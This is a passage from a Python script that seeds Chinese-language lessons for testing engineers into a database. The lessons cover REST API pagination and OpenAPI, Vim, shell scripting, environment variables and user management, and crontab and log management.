| 偏移分页 | `?page=2&page_size=20` | 常规场景 |
| 游标分页 | `?cursor=abc123&limit=20` | 实时数据（避免新增数据导致偏移） |
| Keyset分页 | `?after_id=100&limit=20` | 大数据量场景（利用索引） |

### 过滤、排序、字段选择

'''http
# 多条件过滤
GET /api/v1/users?status=active&role=admin&created_after=2024-01-01

# 排序
GET /api/v1/users?sort=-created_at,age  # -表示降序

# 字段选择（减少数据传输）
GET /api/v1/users?fields=id,username,avatar_url

# 搜索
GET /api/v1/users?q=张三&search_fields=username,nickname
'''

## HATEOAS

HATEOAS（Hypermedia as the Engine of Application State）是REST成熟度模型中最高的级别。响应中包含可用的操作链接。

'''json
{
  "data": {
    "id": 123,
    "amount": 100.00,
    "status": "pending"
  },
  "_links": {
    "self": { "href": "/api/v1/orders/123" },
    "confirm": { "href": "/api/v1/orders/123/confirm", "method": "POST" },
    "cancel": { "href": "/api/v1/orders/123/cancel", "method": "POST" },
    "payment": { "href": "/api/v1/payments?order_id=123", "method": "POST" }
  }
}
'''

HATEOAS使API具有**自描述能力**，客户端可以根据链接发现下一步可执行的操作。但实际落地难度较大，大多数API只做到了Level 2（使用HTTP动词）。

## API文档：Swagger/OpenAPI

OpenAPI（原名Swagger）是目前最流行的API文档规范。

### FastAPI自动生成OpenAPI

FastAPI天然支持OpenAPI，零配置即可生成交互式API文档。

'''python
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI(title="用户管理API", version="1.0.0")

class UserCreate(BaseModel):
    username: str
    email: str
    age: int
    role: str = "user"

@app.post("/api/v1/users", response_model=UserResponse, status_code=201)
async def create_user(user: UserCreate):
    "创建新用户"
    pass

@app.get("/api/v1/users/{user_id}")
async def get_user(user_id: int):
    "获取用户详情"
    pass

# 访问 /docs 查看Swagger UI
# 访问 /redoc 查看ReDoc文档
'''

### API文档的重要性

- **新人上手快**：接口文档清晰，新成员无需反复询问
- **前后端并行开发**：后端未完成时，前端可以基于文档Mock
- **测试依据**：API测试用例应基于接口文档编写
- **自动化测试**：OpenAPI规范可以自动生成测试代码

### API文档工具对比

| 工具 | 特点 | 适用场景 |
|------|------|----------|
| Swagger/OpenAPI | 行业标准，生态丰富 | 大多数项目 |
| Postman Collection | 可直接执行 | 快速开发 |
| Apifox | 国产，文档+Mock+测试一体化 | 国内团队 |
| YApi | 开源，可视化接口管理 | 中小团队 |
| Stoplight | 设计优先的可视化编辑器 | API设计阶段 |

## 本节小结

REST API设计的核心原则：
1. **版本管理**：URL路径版本最直观
2. **标准状态码**：不要所有情况都返回200
3. **统一错误格式**：让客户端能程序化处理错误
4. **完善的分页和过滤**：大数据量场景的必备
5. **完备的文档**：OpenAPI/Swagger是标准选择

好的API设计让前后端协作更顺畅，也让测试工作更有章可循——把API文档作为测试用例设计的基础。"""
    },
]

# ============================================================
# 路径6: 加深"Linux基础命令" - 新增4节
# ============================================================
LESSON_CONTENT["Linux基础命令"] = [
    {
        "title": "第4节：Vim编辑器快速上手",
        "sort_order": 4,
        "knowledge_point": "Vim编辑器",
        "time_estimate": 25,
        "content": """## 为什么测试工程师要学Vim？

Vim是Linux系统上最强大的文本编辑器之一。作为测试工程师，你可能在以下场景需要用到Vim：
- 在服务器上编辑配置文件
- 修改测试脚本或查看日志
- 通过SSH远程操作无GUI的服务器
- 在CI/CD构建环境中修改配置

学习Vim曲线虽然陡峭，但一旦掌握，编辑效率会有质的飞跃。**vimtutor**（Vim内置教程）是入门的最好起点。

## Vim的三种模式

Vim与众不同之处在于它的**模式系统**：

| 模式 | 进入方式 | 作用 | 光标特征 |
|------|----------|------|----------|
| 普通模式（Normal） | Esc / 启动时 | 浏览、删除、复制、粘贴 | 方块 |
| 插入模式（Insert） | i / a / o 等 | 输入文本 | 竖线 |
| 命令模式（Command） | 普通模式下按 : | 保存、退出、搜索、替换 | 出现在底部 |

### 模式切换

'''
启动Vim → 普通模式 (Normal)
         ↓ 按 i         ↓ 按 :
    插入模式 (Insert)    命令模式 (Command)
         ↓ 按 Esc           ↓ 按 Enter 执行
    普通模式 (Normal)    普通模式 (Normal)
'''

**从普通模式进入插入模式的方法**：

| 按键 | 效果 |
|------|------|
| `i` | 在光标前插入 |
| `I` | 在行首插入 |
| `a` | 在光标后追加 |
| `A` | 在行尾追加 |
| `o` | 在下方新建一行 |
| `O` | 在上方新建一行 |

## 基本移动与编辑命令

### 光标移动（普通模式）

'''bash
h    ← 左移          j    ↓ 下移
k    ↑ 上移          l    → 右移

w    下一个单词开头
b    上一个单词开头
e    单词结尾
0    行首
$    行尾
^    第一个非空白字符
gg   文件开头
G    文件末尾
:{number}  跳转到第{number}行
Ctrl+f  向下翻页
Ctrl+b  向上翻页
'''

> 熟练后请不要用方向键！hjkl是Vim高效的关键。

### 编辑命令（普通模式）

'''bash
x    删除光标处字符
dd   删除（剪切）当前行
yy   复制当前行
p    粘贴到光标后
P    粘贴到光标前
u    撤销
Ctrl+r  重做
.    重复上次操作
r    替换单个字符
cw   修改一个单词（删除并进入插入模式）
cc   修改整行
'''

### 提高效率的组合

'''bash
dw   删除一个单词
d$   删除到行尾
d0   删除到行首
y$   复制到行尾
ciw  修改光标所在单词（Change Inner Word）
ci"  修改双引号内的内容
di(  删除括号内的内容
'''

## 查找替换

### 查找（普通模式）

'''bash
/关键字    向下搜索
?关键字    向上搜索
n          下一个匹配
N          上一个匹配
*          查找光标所在单词（向下）
#          查找光标所在单词（向上）
'''

### 替换（命令模式）

'''bash
# 基本替换
:s/old/new/         当前行第一个old替换为new
:s/old/new/g        当前行所有old替换为new
:%s/old/new/g       全文所有old替换为new
:%s/old/new/gc      全文所有（每次确认）

# 带确认的替换（推荐）
:%s/old/new/gc
# 每次匹配会提示：replace with new (y/n/a/q/l/^E/^Y)?
# y=替换这一个  n=跳过  a=全部替换  q=退出  l=替换这一个后退出
'''

### 实用替换示例

'''bash
# 在行首添加注释
:%s/^/# /g

# 删除行尾多余空格
:%s/\\s\\+$//g

# 删除空行
:g/^$/d

# 将多个空行合并为一行
:%s/\\n\\{2,\\}/\\r\\r/g

# 配置文件批量修改
:%s/localhost/192.168.1.100/g
'''

## 常用技巧

### 1. 可视模式（Visual Mode）

'''bash
v        字符选择
V        行选择
Ctrl+v   块选择（列编辑，非常强大！）
'''

**块选择的实用场景**：
- 批量注释/取消注释（选择多行 → `I#` → Esc）
- 对齐多行内容
- 批量修改相同列的内容

### 2. 多文件编辑

'''bash
vim file1.txt file2.txt  # 打开多个文件
:n       下一个文件
:N       上一个文件
:e 文件名 打开另一个文件
:ls      查看打开的文件列表
'''

### 3. 分屏

'''bash
:split 文件名  水平分屏（或 :sp）
:vsplit 文件名 垂直分屏（或 :vsp）
Ctrl+w w       切换窗口
Ctrl+w q       关闭当前窗口
'''

### 4. 快速操作技巧

'''bash
>>   当前行增加缩进
<<   当前行减少缩进
gg=G 自动格式化整个文件
guw  当前单词转小写
gUw  当前单词转大写
~    切换大小写
'''

## 配置文件~/.vimrc常用设置

'''bash
" ~/.vimrc 推荐配置
syntax on              " 语法高亮
set number             " 显示行号
set relativenumber     " 显示相对行号
set tabstop=4          " Tab宽度
set shiftwidth=4       " 缩进宽度
set expandtab          " Tab转空格
set autoindent         " 自动缩进
set hlsearch           " 高亮搜索结果
set incsearch          " 增量搜索
set ignorecase         " 搜索忽略大小写
set smartcase          " 有大写字母时区分大小写
set mouse=a            " 启用鼠标
set encoding=utf-8     " 编码
set clipboard=unnamed  " 使用系统剪贴板
'''

## 学习建议

1. **先学vimtutor**：命令行运行 `vimtutor`，跟随30分钟教程
2. **每天练一个命令**：不用一次学太多，每天掌握2-3个新命令
3. **禁用方向键**：强迫自己用hjkl（在.vimrc中可设置为禁用）
4. **实际使用**：用Vim编辑配置文件、写测试脚本，在实践中进步
5. **善用:help**：`:help commandname` 查看任何命令的详细文档

## 本节小结

Vim是"学会慢、用起来快"的工具。核心掌握：**三种模式切换、hjkl移动、dd/yy/p编辑、/查找、:%s替换**。每天在服务器上实际操作几分钟，一两周就能形成肌肉记忆。"""
    },
    {
        "title": "第5节：Shell脚本编程入门",
        "sort_order": 5,
        "knowledge_point": "Shell脚本",
        "time_estimate": 30,
        "content": """## 为什么测试工程师要学Shell脚本？

Shell脚本在测试工作中无处不在：
- 自动化测试环境的一键部署和销毁
- 定时执行回归测试
- 批量处理测试数据和日志
- CI/CD中的构建和测试脚本
- 系统监控和告警

Shell脚本是连接各个工具和系统的"胶水"，是测试自动化的基础技能。

## Shebang

每个Shell脚本的第一行是Shebang（#!），告诉系统用哪个解释器执行脚本。

'''bash
#!/bin/bash           # 使用Bash
#!/bin/sh             # 使用标准Shell
#!/usr/bin/env bash   # 自动搜索Bash（推荐，更可移植）
#!/usr/bin/env python3 # Python脚本也可用
'''

## 变量

### 定义和使用变量

'''bash
#!/bin/bash

# 定义变量（等号两边不能有空格！）
name="张三"
age=25
BASE_URL="https://api.example.com"

# 使用变量（加$前缀）
echo "姓名: ${name}"        # ${} 是推荐写法
echo "年龄: ${age}岁"
echo "API地址: ${BASE_URL}"

# 特殊变量
echo "脚本名: $0"
echo "第一个参数: $1"
echo "第二个参数: $2"
echo "所有参数: $@"
echo "参数个数: $#"
echo "脚本退出码: $?"
echo "当前进程PID: $$"
'''

### 变量类型

'''bash
# 字符串
str1='单引号不解析变量 $name'  # 输出: 单引号不解析变量 $name
str2="双引号解析变量 ${name}"   # 输出: 双引号解析变量 张三

# 数组
fruits=("apple" "banana" "orange")
echo "第一个: ${fruits[0]}"
echo "全部: ${fruits[@]}"
echo "数量: ${#fruits[@]}"

# 命令替换（两种写法）
today=$(date +%Y-%m-%d)
yesterday=`date -d "yesterday" +%Y-%m-%d`
echo "今天: ${today}, 昨天: ${yesterday}"
'''

## 条件判断 if/case

### if语句

'''bash
#!/bin/bash

# 数值比较
score=85
if [ ${score} -ge 90 ]; then
    grade="A"
elif [ ${score} -ge 80 ]; then
    grade="B"
elif [ ${score} -ge 70 ]; then
    grade="C"
elif [ ${score} -ge 60 ]; then
    grade="D"
else
    grade="F"
fi
echo "成绩等级: ${grade}"

# 字符串比较
USER_INPUT="yes"
if [ "${USER_INPUT}" = "yes" ]; then
    echo "确认操作"
fi

# 文件判断
if [ -f "config.json" ]; then
    echo "配置文件存在"
fi

if [ ! -d "backup" ]; then
    mkdir backup
    echo "创建backup目录"
fi
'''

### 常用判断条件

'''bash
# 数值比较
[ ${a} -eq ${b} ]  # a等于b
[ ${a} -ne ${b} ]  # a不等于b
[ ${a} -gt ${b} ]  # a大于b
[ ${a} -lt ${b} ]  # a小于b
[ ${a} -ge ${b} ]  # a大于等于b
[ ${a} -le ${b} ]  # a小于等于b

# 字符串比较
[ "${s1}" = "${s2}" ]     # 相等
[ "${s1}" != "${s2}" ]    # 不等
[ -z "${s}" ]              # 长度为0
[ -n "${s}" ]              # 长度非0

# 文件测试
[ -f "file" ]  # 是普通文件
[ -d "dir" ]   # 是目录
[ -e "path" ]  # 存在
[ -r "file" ]  # 可读
[ -w "file" ]  # 可写
[ -x "file" ]  # 可执行
[ -s "file" ]  # 非空

# 逻辑运算
[ 条件1 ] && [ 条件2 ]   # 与
[ 条件1 ] || [ 条件2 ]   # 或
[ ! 条件 ]                # 非
'''

> 推荐使用 `[[ ]]` 代替 `[ ]`：`[[ ]]` 更安全、支持正则匹配、不需要转义特殊字符。

### case语句

'''bash
#!/bin/bash

action="$1"

case "${action}" in
    start)
        echo "启动服务..."
        ;;
    stop)
        echo "停止服务..."
        ;;
    restart)
        echo "重启服务..."
        ;;
    status)
        echo "查看状态..."
        ;;
    *)
        echo "用法: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac
'''

## 循环 for/while

### for循环

'''bash
# 遍历列表
for fruit in apple banana orange grape; do
    echo "水果: ${fruit}"
done

# 遍历数组
files=("config.json" "settings.yml" "env.properties")
for file in "${files[@]}"; do
    if [ -f "${file}" ]; then
        echo "处理文件: ${file}"
    fi
done

# 范围循环
for i in {1..5}; do
    echo "第${i}次"
done

# 步长循环
for i in {0..100..10}; do
    echo "${i}%"
done

# 遍历文件
for logfile in /var/log/*.log; do
    echo "归档: ${logfile}"
    gzip "${logfile}"
done

# 遍历命令输出
for user in $(cut -d: -f1 /etc/passwd); do
    echo "用户: ${user}"
done
'''

### while循环

'''bash
#!/bin/bash

# 基本while
count=1
while [ ${count} -le 5 ]; do
    echo "第${count}次执行"
    count=$((count + 1))
done

# 读取文件每一行
while IFS= read -r line; do
    echo "行: ${line}"
done < data.txt

# 无限循环 + 等待条件
while true; do
    # 检查服务是否启动
    if curl -s http://localhost:5000/health > /dev/null; then
        echo "服务已就绪!"
        break
    fi
    echo "等待服务启动..."
    sleep 2
done
'''

## 函数

'''bash
#!/bin/bash

# 定义函数
say_hello() {
    local name="$1"     # local表示局部变量
    echo "Hello, ${name}!"
}

# 有返回值的函数
is_port_open() {
    local host="$1"
    local port="$2"
    if nc -z -w2 "${host}" "${port}" 2>/dev/null; then
        return 0  # 成功（0=成功）
    else
        return 1  # 失败
    fi
}

# 调用函数
say_hello "张三"

# 使用函数返回值
if is_port_open "localhost" 5432; then
    echo "PostgreSQL 端口已开放"
else
    echo "PostgreSQL 端口未开放"
fi

# 函数返回字符串（通过echo）
get_date_str() {
    echo "$(date +%Y-%m-%d_%H-%M-%S)"
}
timestamp=$(get_date_str)
echo "时间戳: ${timestamp}"
'''

### 一个完整的测试脚本示例

'''bash
#!/bin/bash
# 接口健康检查脚本

set -e  # 遇到错误立即退出
set -u  # 使用未定义变量时报错

API_URL="${1:-http://localhost:5000}"
TIMEOUT=30
MAX_RETRIES=3

log_info() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] $1"
}

log_error() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $1" >&2
}

check_health() {
    log_info "开始检查 ${API_URL}"
    
    for i in $(seq 1 ${MAX_RETRIES}); do
        response=$(curl -s -o /dev/null -w "%{http_code}" \\
                    --connect-timeout "${TIMEOUT}" \\
                    "${API_URL}/health")
        
        if [ "${response}" = "200" ]; then
            log_info "健康检查通过!"
            return 0
        fi
        
        log_error "第${i}次尝试失败 (HTTP ${response})，等待3秒后重试..."
        sleep 3
    done
    
    log_error "健康检查失败!"
    return 1
}

main() {
    check_health
    exit_code=$?
    
    if [ ${exit_code} -eq 0 ]; then
        exit 0
    else
        exit 1
    fi
}

main
'''

## 脚本调试 set -x

'''bash
#!/bin/bash

# 调试选项
set -x   # 显示每条命令的执行过程
set -e   # 命令失败时退出
set -u   # 使用未定义变量时报错
set -o pipefail  # 管道中任一命令失败则整体失败

# 局部调试
set -x
echo "这段会被跟踪"
set +x  # 关闭跟踪
echo "这段不会被跟踪"
'''

'''bash
# 运行时启用调试
bash -x script.sh           # 整体调试
bash -v script.sh           # 显示每行代码
bash -n script.sh           # 语法检查（不执行）
'''

## 本节小结

Shell脚本的五大核心：**变量、条件判断、循环、函数、调试**。掌握这些就能写出实用的自动化脚本。记住：
- 变量等号两边不能有空格
- `[[ ]]` 比 `[ ]` 更好用
- 用 `set -euxo pipefail` 让脚本更健壮
- 复杂的逻辑用函数组织"""

    },
    {
        "title": "第6节：环境变量与用户管理",
        "sort_order": 6,
        "knowledge_point": "环境变量与用户管理",
        "time_estimate": 25,
        "content": """## 关键环境变量

Linux的环境变量是操作系统级别或会话级别的配置参数，影响程序的行为。测试工程师经常需要通过环境变量切换测试环境、配置数据库连接等。

### 常用系统环境变量

| 变量 | 说明 | 示例值 |
|------|------|--------|
| `$HOME` | 当前用户主目录 | `/home/username` |
| `$USER` | 当前用户名 | `root` 或 `tester` |
| `$PATH` | 可执行文件搜索路径 | `/usr/local/bin:/usr/bin:/bin` |
| `$SHELL` | 当前Shell | `/bin/bash` |
| `$PWD` | 当前工作目录 | `/home/username/projects` |
| `$LANG` | 系统语言 | `zh_CN.UTF-8` |
| `$HOSTNAME` | 主机名 | `test-server-01` |

### 查看和设置环境变量

'''bash
# 查看单个变量
echo $HOME
echo $PATH

# 查看所有环境变量
env
printenv

# 临时设置（仅当前Shell）
export APP_ENV=testing
export DATABASE_URL="postgresql://user:pass@localhost:5432/mydb"
export LOG_LEVEL=debug

# 删除变量
unset APP_ENV

# 追加到PATH
export PATH="$PATH:/opt/myapp/bin"
'''

## 环境变量配置文件

Linux启动Shell时会按顺序加载以下配置文件：

### 登录Shell（Login Shell）

'''
/etc/profile        → 全局配置（所有用户）
~/.bash_profile     → 用户个人配置（优先于.profile）
~/.bashrc           → 交互式Shell配置（通常被.bash_profile引用）
~/.profile          → 用户个人配置（备选）
'''

### 非登录Shell（Non-Login Shell）

'''
/etc/bash.bashrc    → 全局Bash配置
~/.bashrc           → 用户Bash配置
'''

### 实用的~/.bashrc自定义

'''bash
# ~/.bashrc 常用自定义

# 别名
alias ll='ls -alFh'
alias la='ls -A'
alias ..='cd ..'
alias ...='cd ../..'
alias gst='git status'
alias gl='git log --oneline --graph --decorate'

# 环境变量
export PATH="$HOME/.local/bin:$PATH"
export EDITOR=vim

# 测试环境快捷切换
alias testenv='export APP_ENV=testing && export API_URL=http://test-api.example.com'
alias devenv='export APP_ENV=development && export API_URL=http://localhost:5000'
alias prodenv='export APP_ENV=production && export API_URL=https://api.example.com'

# 彩色提示符
export PS1='\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '

# 使配置生效
source ~/.bashrc
# 或
. ~/.bashrc
'''

### 环境变量加载顺序（重要）

测试中可能遇到"配置了环境变量但不生效"的问题，通常是加载顺序问题：

'''
1. /etc/environment（系统级，最早）
2. /etc/profile
3. ~/.bash_profile
4. ~/.bashrc
5. ~/.profile
'''

排查技巧：
- 使用 `echo $变量名` 确认当前值
- 使用 `env | grep 变量名` 查看所在环境
- 检查变量是否在正确的配置文件中

## 用户管理

### 用户相关文件

| 文件 | 存储内容 |
|------|----------|
| `/etc/passwd` | 用户账号信息 |
| `/etc/shadow` | 加密密码（仅root可读） |
| `/etc/group` | 组信息 |
| `/etc/sudoers` | sudo权限配置 |

### 创建用户 useradd

'''bash
# 基本创建
sudo useradd tester

# 创建用户并指定主目录、Shell
sudo useradd -m -d /home/tester -s /bin/bash tester

# 创建系统用户（用于运行服务）
sudo useradd -r -s /usr/sbin/nologin myapp

# 创建用户并加入多个组
sudo useradd -m -G docker,www-data tester

# 创建用户后设置密码
sudo passwd tester
'''

### 修改用户 usermod

'''bash
# 修改用户名
sudo usermod -l newname oldname

# 修改主目录
sudo usermod -d /new/home/path -m username

# 将用户加入附加组
sudo usermod -aG docker username
sudo usermod -aG sudo username     # 赋予sudo权限

# 锁定/解锁账号
sudo usermod -L username   # 锁定
sudo usermod -U username   # 解锁

# 设置账号过期日期
sudo usermod -e 2024-12-31 username
'''

### 删除用户 userdel

'''bash
# 删除用户
sudo userdel username

# 删除用户及其主目录和邮件
sudo userdel -r username
'''

### 管理组

'''bash
# 添加组
sudo groupadd testers

# 将用户加入组
sudo gpasswd -a username testers

# 将用户从组中移除
sudo gpasswd -d username testers

# 查看用户所属组
groups username
id username
'''

## sudo配置

sudo允许普通用户以root权限执行特定命令，而不需要知道root密码。

### 编辑sudoers（必须用visudo！）

'''bash
# 安全编辑sudoers
sudo visudo

# 或编辑特定文件
sudo visudo -f /etc/sudoers.d/custom
'''

### sudoers配置示例

'''bash
# /etc/sudoers.d/testers

# 允许testers组的所有命令
%testers ALL=(ALL:ALL) ALL

# 允许特定用户免密码执行特定命令
tester ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp
tester ALL=(ALL) NOPASSWD: /usr/bin/systemctl status myapp

# 允许重启和关闭（需要密码）
tester ALL=(ALL) /usr/sbin/reboot, /usr/sbin/shutdown
'''

### 测试环境中的sudo应用

测试人员经常需要执行以下需要sudo的操作：
- 重启测试服务
- 修改配置文件（属于root或其他用户）
- 查看系统日志
- 安装测试依赖的软件包

## 本节小结

环境变量和用户管理是Linux运维的基础。测试工程师需要掌握：
- **环境变量**：export设置、profile/bashrc配置文件、加载顺序
- **用户管理**：useradd/adduser创建、usermod修改、userdel删除
- **sudo配置**：visudo安全编辑、NOPASSWD免密配置

理解环境变量的加载机制可以解决很多"配置了但没生效"的诡异问题。"""
    },
    {
        "title": "第7节：定时任务与日志管理",
        "sort_order": 7,
        "knowledge_point": "定时任务与日志",
        "time_estimate": 25,
        "content": """## crontab定时任务

crontab是Linux中的定时任务调度工具。测试工程师常用它来：
- 定时执行回归测试
- 定期清理测试数据
- 定时收集测试报告
- 环境健康检查

### crontab格式

'''
*    *    *    *    *    要执行的命令
┬    ┬    ┬    ┬    ┬
│    │    │    │    │
│    │    │    │    └───── 星期 (0-7，0和7都是周日)
│    │    │    └────────── 月份 (1-12)
│    │    └─────────────── 日期 (1-31)
│    └──────────────────── 小时 (0-23)
└───────────────────────── 分钟 (0-59)
'''

### crontab示例

'''bash
# 每天早上6点执行回归测试
0 6 * * * cd /opt/tests && ./run_regression.sh

# 每5分钟检查一次API健康状态
*/5 * * * * /opt/scripts/health_check.sh

# 每周日凌晨2点清理测试数据
0 2 * * 0 /opt/scripts/clean_test_data.sh

# 每月1号凌晨3点生成月度报告
0 3 1 * * /opt/scripts/generate_monthly_report.sh

# 工作日（周一到周五）每小时执行
0 * * * 1-5 /opt/scripts/hourly_check.sh

# 每隔2小时（0,2,4,6,...22点）
0 */2 * * * /opt/scripts/bi_hourly_test.sh

# 特定时间点
30 8,12,16,20 * * * /opt/scripts/checkpoint.sh  # 8:30,12:30,16:30,20:30
'''

### crontab命令

'''bash
# 查看当前用户的定时任务
crontab -l

# 编辑当前用户的定时任务
crontab -e

# 删除当前用户的定时任务
crontab -r

# 以其他用户身份操作
sudo crontab -u username -l
sudo crontab -u username -e

# 系统级定时任务目录
/etc/crontab              # 系统级crontab
/etc/cron.d/              # 额外的系统定时任务
/etc/cron.daily/          # 每天执行
/etc/cron.hourly/         # 每小时执行
/etc/cron.weekly/         # 每周执行
/etc/cron.monthly/        # 每月执行
'''

### crontab常见问题

**1. 环境变量问题**
crontab运行的环境与登录Shell不同，PATH等变量可能不完整。
'''bash
# 解决办法：在crontab或脚本中显式设置
PATH=/usr/local/bin:/usr/bin:/bin
0 6 * * * /opt/scripts/run.sh

# 或source配置文件
0 6 * * * source ~/.bashrc && /opt/scripts/run.sh
'''

**2. 脚本无执行权限**
'''bash
# 确保脚本有执行权限
chmod +x /opt/scripts/run.sh
'''

**3. 日志输出处理**
'''bash
# 重定向输出到日志文件
0 6 * * * /opt/scripts/run.sh >> /var/log/test.log 2>&1

# 丢弃所有输出
0 6 * * * /opt/scripts/run.sh > /dev/null 2>&1
'''

**4. 调试crontab**
'''bash
# 先手动执行确认脚本正常
/opt/scripts/run.sh

# 缩短周期调试
* * * * * /opt/scripts/run.sh >> /tmp/debug.log 2>&1  # 每分钟执行
'''

## 日志轮转 logrotate

日志文件会随时间不断增长，需要定期轮转（rotate）来防止占满磁盘。

### logrotate配置文件

'''bash
# /etc/logrotate.d/myapp
/var/log/myapp/*.log {
    daily                     # 每天轮转
    rotate 30                 # 保留30个归档
    missingok                 # 日志文件不存在不报错
    notifempty               # 文件为空不轮转
    compress                  # 压缩旧日志
    delaycompress             # 延迟压缩（最近一个不压缩）
    dateext                   # 使用日期后缀
    dateformat -%Y%m%d
    maxsize 100M             # 超过100M强制轮转（即使不到daily）
    create 644 appuser appgroup  # 轮转后创建新文件的权限
    postrotate                # 轮转后执行的命令
        /usr/bin/systemctl reload myapp > /dev/null
    endscript
}
'''

### 测试日志轮转配置

'''bash
# /etc/logrotate.d/test-logs
/opt/tests/logs/*.log {
    daily
    rotate 14                 # 保留2周
    compress
    missingok
    notifempty
    copytruncate              # 复制后截断（不关闭文件）
}
'''

### logrotate命令

'''bash
# 手动强制执行轮转
sudo logrotate -f /etc/logrotate.conf
sudo logrotate -f /etc/logrotate.d/myapp

# 调试模式（不实际执行）
sudo logrotate -d /etc/logrotate.d/myapp

# 查看logrotate状态
cat /var/lib/logrotate/status
'''

## journalctl使用

systemd的journalctl是现代Linux系统的日志查看利器。

### 基本使用

'''bash
# 查看所有日志（从最新开始）
journalctl

# 实时跟踪日志
journalctl -f

# 查看最近100条
journalctl -n 100

# 查看指定时间范围的日志
journalctl --since "2024-01-15 10:00:00"
journalctl --since "2024-01-15 10:00:00" --until "2024-01-15 12:00:00"
journalctl --since "1 hour ago"
journalctl --since "today"

# 查看指定服务的日志
journalctl -u nginx
journalctl -u myapp -f      # 实时跟踪
journalctl -u myapp --since today

# 按优先级过滤
journalctl -p err           # 只看错误及以上
journalctl -p warning       # 警告及以上
# 优先级: emerg(0) alert(1) crit(2) err(3) warning(4) notice(5) info(6) debug(7)

# 查看内核日志
journalctl -k
'''

### 实用高级用法

'''bash
# 查看本次启动的日志
journalctl -b

# 查看上一次启动的日志（排查重启问题）
journalctl -b -1

# 查看某个可执行文件的日志
journalctl /usr/bin/myapp

# JSON格式输出（方便脚本处理）
journalctl -u myapp -o json

# 简洁输出
journalctl -u myapp -o cat

# 按用户过滤
journalctl _UID=1000

# 导出日志归档
journalctl -u myapp --since "2024-01-01" > /tmp/myapp_logs_2024.txt
'''

## rsyslog配置

rsyslog是Linux传统的日志系统，syslog的后继者。

### rsyslog配置文件

'''bash
# /etc/rsyslog.conf 或 /etc/rsyslog.d/50-default.conf

# 设施.优先级    日志文件
auth,authpriv.*    /var/log/auth.log
*.*;auth,authpriv.none  -/var/log/syslog
kern.*            -/var/log/kern.log
mail.*            -/var/log/mail.log
user.*            -/var/log/user.log

# 自定义应用日志
local0.*          /var/log/myapp/app.log
local1.*          /var/log/myapp/error.log
'''

### 应用配置rsyslog

'''python
# Python应用中使用syslog
import logging
from logging.handlers import SysLogHandler

logger = logging.getLogger('myapp')
handler = SysLogHandler(address='/dev/log', facility=SysLogHandler.LOG_LOCAL0)
handler.setFormatter(logging.Formatter('myapp[%(process)d]: %(message)s'))
logger.addHandler(handler)
logger.warning("这是一条测试日志")
'''

### 远程日志收集

'''bash
# 服务端配置（接收日志）
# /etc/rsyslog.conf
module(load="imudp")
input(type="imudp" port="514")

# 客户端配置（发送日志）
# /etc/rsyslog.conf
*.* @logserver.example.com:514   # UDP
*.* @@logserver.example.com:514  # TCP更可靠
'''

## 测试日志管理最佳实践

1. **结构化日志**：使用JSON格式，方便解析和分析
'''json
{"timestamp": "2024-01-15T10:30:00Z", "level": "INFO", "test_case": "TC_001", "status": "passed", "duration": 0.35}
'''
2. **日志级别划分**：DEBUG（本地开发）、INFO（生产）、WARNING、ERROR
3. **关键信息记录**：请求ID、用户操作、错误堆栈
4. **敏感信息脱敏**：密码、Token、身份证号等不能出现在日志中
5. **日志保留策略**：根据合规要求和存储容量设定

## 本节小结

定时任务和日志管理是运维自动化的重要环节：
- **crontab**：定时执行任务，注意环境变量和日志重定向
- **logrotate**：自动轮转日志文件，防止磁盘爆满
- **journalctl**：systemd日志管理，查看服务日志首选
- **rsyslog**：传统但强大的日志系统，支持远程收集

测试自动化的最后一步往往是"定时运行+日志监控"，掌握这些工具让你能构建完整的自动化测试体系。"""
    },
]

# ================================================================
# 主逻辑
# ================================================================


async def seed_lessons():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with async_session() as session:
        total_added = 0
        stats = {}

        for path_title, lessons in LESSON_CONTENT.items():
            stmt = select(LearningPath).where(LearningPath.title == path_title)
            result = await session.execute(stmt)
            path = result.scalar_one_or_none()

            if not path:
                print(f"  [SKIP] Learning path not found: {path_title}")
                continue

            added = 0
            for lesson_data in lessons:
                existing_stmt = select(LessonSection).where(
                    LessonSection.title == lesson_data["title"],
                    LessonSection.learning_path_id == path.id
                )
                existing_result = await session.execute(existing_stmt)
                if existing_result.scalar_one_or_none():
                    continue
                lesson = LessonSection(**lesson_data, learning_path_id=path.id)
                session.add(lesson)
                added += 1

            stats[path_title] = added
            total_added += added
            print(f"  [OK] '{path_title}': +{added} lessons")

        await session.commit()

        print("\n" + "=" * 60)
        print(f"[DONE] Added {total_added} lessons across {len(stats)} paths")
        print("=" * 60)


if __name__ == "__main__":
    print("=" * 60)
    print("[START] Seeding learning content V2 Part2 (lesson sections)...")
    print("=" * 60)
    asyncio.run(seed_lessons())